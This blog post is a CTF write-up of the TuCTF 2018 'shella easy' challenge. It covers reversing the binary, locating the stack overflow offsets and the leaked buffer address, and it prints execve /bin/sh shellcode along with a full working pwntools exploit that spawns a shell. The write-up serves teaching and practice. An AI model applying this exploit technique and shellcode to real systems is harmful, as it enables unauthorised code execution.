+++
tags = ["shellcode","ctf","linux"]
categories = ["Capture the Flag", "Binary Exploitation"]
date = "2021-08-11"
description = "A writeup for the binary exploitation challenge 'shella easy' from TuCTF 2018."
featuredpath = "date"
linktitle = ""
title = "TuCTF 2018 :: Shella Easy"
slug = "tuctf-2018-shella-easy"
type = "post"
+++

## Reverse Engineering

From the `file` command we can see that it is a dynamically linked linux executable.

```
$ file shella-easy
shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped
```

Running `checksec` on the binary reveals that it contains no exploit protections in place (particularly of note are the lack of stack canary, PIE is not enabled, and that the NX bit is not set).

```
$ checksec ./shella-easy
[*] './shella-easy'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

This means a few things for us:
 - We know where everything is stored inside the binary.
 - We can execute arbitrary shellcode on the stack.
 - A stack overflow can give us control over program execution. 

Running `shella-easy` shows that the binary (at some point) takes user input. We'll need to reverse it in order to understand how it does this, but it is a potential avenue for exploitation.

```
$ ./shella-easy
I'll have a 0xffc40780 with a side of fries thanks
asdfasdf
```

Reversing the `main` function of the binary reveals that it uses `gets` to take user input. As we suspected, this is likely where we can exploit this.

```
0x08048532      83c408         add esp, 8
0x08048535      8d45b8         lea eax, [s]
0x08048538      50             push eax                    ; char *s
0x08048539      e852feffff     call sym.imp.gets           ; char *gets(char *s)
```

Another important thing to note, is that the binary does have some protections in place against stack overflows; if the variable `var_8h` is not set to `0xdeadbeef`, the binary will immediately exit (instead of returning and giving us control).

```
    0x08048541      817df8efbead.  cmp dword [var_8h], 0xdeadbeef
┌─< 0x08048548      7407           je 0x8048551
│   0x0804854a      6a00           push 0                      ; int status
│   0x0804854c      e84ffeffff     call sym.imp.exit           ; void exit(int status)
└─> 0x08048551      b800000000     mov eax, 0
    0x08048556      8b5dfc         mov ebx, dword [var_4h]
    0x08048559      c9             leave
    0x0804855a      c3             ret
```

We can also see that this variable `var_8h` is initially set to a value of `0xcafebabe` higher up in the instruction stream. 

```
0x0804851b      c745f8bebafe.  mov dword [var_8h], 0xcafebabe
```

We'll want to find out where `var_8h` is stored relative to where our input `s` is stored, so we can overwrite the value of it in order to bypass this check (when we perform our overflow).

Radare tells us a little about where these variables are supposed to be stored (in the `main` function header), but we'll want to verify this later.

```
; var char *s @ ebp-0x48
; var uint32_t var_8h @ ebp-0x8
; var int32_t var_4h @ ebp-0x4
```

We can see that the `var_8h` is stored below our input buffer `s` on the stack, this is good for us as we can overwrite its value when we perform our overflow.

A quick calculation `0x48 - 0x8 = 0x40 = 64` tells us that `var_8h` is stored 64 bytes after the start of our input buffer.


## Information Gathering

First, let's spin up GDB and verify the location of `var_8h` relative to our input buffer `s`.

We'll set a breakpoint just after the `gets` call so we can see what the stack looks like just after we've provided the binary with input.

```
pwndbg> disassemble main
Dump of assembler code for function main:

...

   0x08048539 <+94>:    call   0x8048390 <gets@plt>
   0x0804853e <+99>:    add    esp,0x4
   0x08048541 <+102>:   cmp    DWORD PTR [ebp-0x8],0xdeadbeef
   0x08048548 <+109>:   je     0x8048551 <main+118>
   0x0804854a <+111>:   push   0x0
   0x0804854c <+113>:   call   0x80483a0 <exit@plt>
   0x08048551 <+118>:   mov    eax,0x0
   0x08048556 <+123>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08048559 <+126>:   leave  
   0x0804855a <+127>:   ret    

...

pwndbg> b *0x0804853e
Breakpoint 1 at 0x804853e
```

We can now run the binary inside GDB and we'll give it the value `AAAA` when it prompts us for input, so we can easily see where our input is stored inside the stack.

```
pwndbg> r
Starting program: ./shella-easy 
Yeah I'll have a 0xffffcff0 with a side of fries thanks
AAAA

Breakpoint 1, 0x0804853e in main ()

...
```

After dumping the relevant part of the stack, we can verify the location of `var_8h` relative to `s` with a simple calculation; `0xffffd030 - 0xffffcff0 = 64`. 

```
pwndbg> x/20x $ebp-0x48
0xffffcff0:     0x41414141      0xf7fe3200      0x00000000      0xf7e02c1e
0xffffd000:     0xf7fb03fc      0xffffffff      0x00000000      0x080485ab
0xffffd010:     0x00000001      0xffffd0e4      0xffffd0ec      0x08048581
0xffffd020:     0xf7fe3230      0x00000000      0x08048569      0x00000000
0xffffd030:     0xcafebabe      0x00000000      0x00000000      0xf7de9e46
```

While we're at this breakpoint, we can also take a look at what the binary is leaking. Yep, it's definitely the location of our input buffer on the stack, this will make the exploitation process a lot easier.

```
pwndbg> x/x 0xffffcff0
0xffffcff0:     0x41414141
```

Now let's find the location of the function's return address stored on the stack relative to our input buffer.

We can write a quick script using pwntools that sends a cyclic pattern of bytes (with the `var_8h` variable overwritten with `0xdeadbeef`) that we can use to determine the location of the return address. 

```py
#!/usr/bin/env python3

from pwn import *


pad = b'A'*64
var = p32(0xdeadbeef)

r = process('./shella-easy')
gdb.debug(r)

r.writeline(pad + var + cyclic(64))
r.interactive()
```

We know that the program should crash once we've overwritten the return address with our bad data. So printing the value of `$eip` after the crash should give us the bytes that the return address was overwritten with.

```
pwndbg> p $eip
$1 = (void (*)()) 0x61616163
```

We can use pwntools' `cyclic_find` function and the bytes contained within `eip` above, in order to find the offset of the return address from the end of our payload. 

```py
In [2]: cyclic_find(0x61616163)
Out[2]: 8
```

## Exploit Development

Now that we know the location of `var_8h` and the return address relative to our input buffer we can begin to craft our exploit.

We know that we can execute arbitrary code within the stack, so let's write up some quick shellcode to give us an interactive shell.

```
.global _start

_start:
.intel_syntax noprefix
shell:
    push 0x0068732f     # "/sh"
    push 0x6e69622f     # "/bin"
    mov ebx, esp        # "/bin/sh"
    mov ecx, 0
    mov edx, 0
    mov eax, 11
    int 0x80            # execve("/bin/sh", 0, 0)
exit:
    mov ebx, 0          # exit code
    mov eax, 0
    int 0x80            # exit(0)
```

Let's compile our shellcode, and get a representation of it that we can use in our exploit code.

```
$ gcc -nostdlib -static shellcode.s -o shellcode -m32
$ objcopy --dump-section .text=payload shellcode
```

```py
In [1]: open('payload','rb').read()
Out[1]: b'h/sh\x00h/bin\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xcd\x80'
```

Now we can build our exploit. Here is an outline of what we want to achieve:
 - Capture the leaked stack address.
 - Overwrite `var_8h` with `0xdeadbeef`.
 - Overwrite the return address using the leak.
 - Get code execution.

```py
#!/usr/bin/env python3

from pwn import *


buf = b'h/sh\x00h/bin\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xcd\x80'

pad = b'A'*(64 - len(buf))
var = p32(0xdeadbeef)
off = b'A'*8

r = process('./shella-easy')
#gdb.attach(r)

# capture the leaked stack address
r.readuntil('Yeah I\'ll have a ')
leak = p32(eval(r.read(10)))
r.clean()

# send our payload to the binary
r.writeline(buf + pad + var + off + leak)
r.interactive()
```

And finally, here's the exploit in action.

```
./exploit.py 
[+] Starting local process './shella-easy': pid 3768
[*] Switching to interactive mode
$ cat flag.txt
TuCTF{Shella Easy}
```
